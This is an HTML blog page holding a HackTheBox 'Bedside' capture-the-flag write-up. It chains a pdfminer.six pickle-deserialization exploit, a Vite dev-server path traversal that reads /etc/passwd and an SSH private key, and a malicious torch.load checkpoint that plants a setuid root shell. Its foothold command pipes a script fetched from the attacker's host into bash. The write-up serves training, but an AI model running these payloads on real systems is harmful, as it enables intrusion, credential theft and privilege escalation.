@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Bedside - HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Bedside (Medium, Linux) full write up: pdfminer.six pickle RCE → internal Vite LFI → leaked SSH key → torch.load checkpoint deserialization → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-medium{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.3);color:#fbbf24}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / medium / linux</p>
+      <h1>Bedside</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-medium">Medium</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Bedside is a medium Linux box held together by dangerous Python serialization on both sides of the flag. A <strong>file upload backed by pdfminer.six</strong> is abused with a known pickle-deserialization CVE for an initial shell. The internal <strong>Vite dev server on port 3000</strong> (filtered from outside) suffers a path-traversal that leaks <code>developer</code>'s SSH key. Finally, a <code>sudo</code>-runnable training script feeds a <strong>crafted <code>torch.load()</code> checkpoint</strong> into the same deserialization sink for a root shell.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Subdomain enumeration and vhost fuzzing</li>
+        <li>Basic Python pickle/torch deserialization knowledge</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Exploiting pdfminer.six (CVE-2025-64512) via file upload</li>
+        <li>Path traversal against an internal Vite dev server</li>
+        <li>Credential/key discovery through the internal service</li>
+        <li>RCE through <code>torch.load()</code> checkpoint deserialization</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>The port scan shows SSH, an Apache site, and a <strong>filtered port 3000</strong> - worth remembering.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-19 06:30 -0400
+Nmap scan report for bedside.htb (10.129.55.235)
+Host is up (0.038s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4
+80/tcp   open     http    Apache httpd 2.4.68 (Debian)
+3000/tcp filtered ppp</pre>
+      <p>Vhost fuzzing reveals a subdomain.</p>
+      <pre>ffuf -u http://bedside.htb -H 'Host: FUZZ.bedside.htb' \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 21
+
+research   [Status: 200, Size: 3152]</pre>
+
+      <h2>Foothold</h2>
+      <h3>pdfminer.six pickle RCE</h3>
+      <p><code>research.bedside.htb</code> hosts a file upload. A response header gives away the backend:</p>
+      <pre>X-Powered-By: pdfminer.six</pre>
+      <p>pdfminer.six is vulnerable to <strong>CVE-2025-64512</strong>: a crafted PDF can smuggle a <strong>pickle.gz</strong> file that gets deserialized on the server. The PoC ships two helpers - <code>mkpickle.py</code> builds a gzipped pickle whose payload is our command, and <code>mkpdf.py</code> wraps it in a PDF with a configurable extraction path.</p>
+      <pre>python mkpickle.py 'curl http://10.10.14.185:8000/rev.sh | bash' pwn.pickle.gz
+[+] pwn.pickle.gz (106 bytes)
+    cmd: curl http://10.10.14.185:8000/rev.sh | bash
+
+python mkpdf.py -o pwn.pdf -p '/var/www/research.bedside.htb/uploads' pwn
+[+] pwn.pdf -&gt; /var/www/research.bedside.htb/uploads/pwn.pickle.gz</pre>
+      <p>The extraction path had to point at the <em>vhost's</em> document root (<code>/var/www/research.bedside.htb/uploads</code>) - getting that wrong is what stalled the foothold. Uploading the crafted PDF triggers the pickle, and a reverse shell lands as <code>datawrangler</code>.</p>
+
+      <h2>Lateral Movement</h2>
+      <h3>Internal Vite dev server</h3>
+      <p>LinPEAS finds nothing exciting, but the filtered port <strong>3000</strong> from the scan is bound locally. Curling it from the shell reveals a React <strong>image viewer</strong> built with Vite/esm.sh.</p>
+      <pre>curl localhost:3000
+  &lt;title&gt;Bedside Clinic - Image Viewer&lt;/title&gt;
+  ... import React from './vendor/react.js' ...
+  &lt;script type="module"&gt;import createHotContext from"/@hmr";...
+  💚 Built with esm.sh/x</pre>
+
+      <h3>Path traversal → SSH key</h3>
+      <p>Vite dev servers are vulnerable to path traversal. With <code>--path-as-is</code> we read files from outside the web root.</p>
+      <pre>curl --path-as-is http://localhost:3000/../../../../etc/passwd
+developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+
+curl --path-as-is http://localhost:3000/../../../../home/developer/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----</pre>
+      <p>The leaked private key logs us in as <code>developer</code>.</p>
+      <pre>ssh -i id_dev developer@bedside.htb</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>sudo - bedside_trainer.py</h3>
+      <p><code>developer</code> can run a training script as root without a password.</p>
+      <pre>sudo -l
+User developer may run the following commands on bedside:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</pre>
+      <p>The trainer reads model checkpoints from <code>/datastore/checkpoints</code> (and requires an image in <code>/datastore/processed</code>). PyTorch checkpoints are pickles - a malicious <code>.pt</code> gives us a <code>__reduce__</code> RCE when the trainer calls <code>torch.load()</code>.</p>
+
+      <h3>Chaining the upload back into the datastore</h3>
+      <p>We drop a malicious zip through the research upload, have <code>datawrangler</code> extract the checkpoint into the datastore, and plant a dummy processed image so the trainer runs.</p>
+      <pre># developer shell - create a malicious checkpoint + zip, upload it
+python3 -c 'import torch,os;E=type("E",(),{"__reduce__":lambda s:(os.system,("cp /bin/bash /usr/local/bin/rootbash;chmod 4755 /usr/local/bin/rootbash",))});torch.save(E(),"root.pt")'
+python3 -c "import zipfile;z=zipfile.ZipFile('root.zip','w');z.write('root.pt');z.close()"
+curl -s -F 'uploadFile=@root.zip;type=application/zip' http://research.bedside.htb/ &gt;/dev/null
+
+# datawrangler shell - extract into the datastore + dummy processed image
+python3 -c "import zipfile;zipfile.ZipFile('/var/www/research.bedside.htb/uploads/root.zip').extract('root.pt','/datastore/checkpoints')"
+touch /datastore/checkpoints/root.pt
+echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII= | base64 -d &gt;/datastore/processed/x.png</pre>
+      <p>Running the trainer as root deserializes the checkpoint, which copies <code>/bin/bash</code> to <code>/usr/local/bin/rootbash</code> with the setuid bit - and we get a root shell.</p>
+      <pre># developer shell → root
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py &gt;/dev/null 2&gt;&amp;1
+/usr/local/bin/rootbash -p -c 'id; cat /root/root.txt'</pre>
+      <p>If <code>rootbash</code> doesn't exist yet, clear the processed dir and touch a fresh checkpoint, then re-run:</p>
+      <pre># datawrangler
+find /datastore/processed -mindepth 1 -type f -delete
+echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII= | base64 -d &gt;/datastore/processed/x.png
+touch /datastore/checkpoints/r3.pt
+
+# developer
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py &gt;/dev/null 2&gt;&amp;1
+ls -l /usr/local/bin/rootbash
+/usr/local/bin/rootbash -p -c 'id; cat /root/root.txt'</pre>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>Filtered ports are still attack surface</strong> - port 3000 was only reachable from inside, and it was the pivot to a shell.</li>
+        <li><strong>File uploads + deserialization libraries</strong> are RCE by default: pdfminer.six pickles, torch checkpoints are pickles - same sink, two boxes.</li>
+        <li><strong>Vite dev servers ship path traversal</strong> out of the box; never run them on anything that can be reached by a shell.</li>
+        <li><strong>Get the document root right</strong> - payload extraction paths are vhost-specific, and a wrong one fails silently.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
